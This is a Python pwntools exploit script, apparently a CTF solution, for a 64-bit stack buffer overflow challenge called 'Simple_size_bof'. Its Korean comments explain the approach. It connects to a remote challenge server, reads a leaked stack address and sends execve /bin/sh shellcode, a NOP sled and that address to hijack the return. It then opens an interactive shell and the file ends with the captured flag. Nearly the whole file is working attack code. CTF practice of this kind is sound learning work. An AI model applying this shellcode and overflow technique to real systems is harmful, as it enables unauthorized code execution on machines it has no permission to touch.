#! -*- coding: utf-8 -*-
from pwn import *

#p = process("./Simple_size_bof")
p = remote("ctf.j0n9hyun.xyz",3005)

shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# 역시나 64비트 bof 문제, 이번엔 스택 주소를 알려준다.
# 쉘코드를 실행시키라는 소리같다.
# 쉘코드를 스택 제일 위에 올리고 nop sled, 마지막엔 알려주는 스택 주소를 넣어준다. 

p.recvuntil("buf: ")
rcv = int(p.recv(),16)
# 입력위치 0x7fffffff7630 , ret 0x7fffffffe368 , 스택거리 27960 ...?
log.info("buf : "+hex(rcv))
pause()
payload = shell
payload += "\x90"*(27960-len(shell))
payload += p64(rcv)

p.sendline(payload)

p.interactive()

#HackCTF{s000000_5m4ll_4nd_5m4ll_51z3_b0f}
